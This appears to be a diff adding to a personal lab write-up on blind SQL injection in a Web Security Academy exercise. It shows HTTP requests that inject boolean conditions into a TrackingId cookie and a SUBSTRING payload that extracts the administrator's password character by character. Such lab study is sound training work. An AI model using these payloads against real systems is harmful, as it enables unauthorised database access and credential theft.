@@ -21,7 +21,33 @@
 - An cookie's been assigned named "TrackingId" in the response:
 ![[Pasted image 20260803183725.png]]
 
-- After that, every 
+- After refreshing the website, we always see a "Welcome back!" greeting:
+![[Pasted image 20260803183950.png]]
+- The "TrackingId" appears in the request, which we can modify and change it to try using SQL injection.
+- ![[Pasted image 20260803184048.png]]
+
+ - First, I tried these two payloads:
+ ```http
+ GET / HTTP/2
+Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
+Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND '1' = '1
+ ```
+
+``` http
+GET / HTTP/2
+Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
+Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND '1' = '2
+```
+As predicted, the results were different, which means we are now granted some access to the database. 
+Reading the LAB's description, we know that :
+"The database contains a different table called `users`, with columns called `username` and password."
+
+ That means, we can take advantage of the "Welcome back!" greeting as a way to crack the password, using the following payload:
+``` http
+GET / HTTP/2
+Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
+Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), *Char_index, 1) > '*character'
+```
 
 
 ---
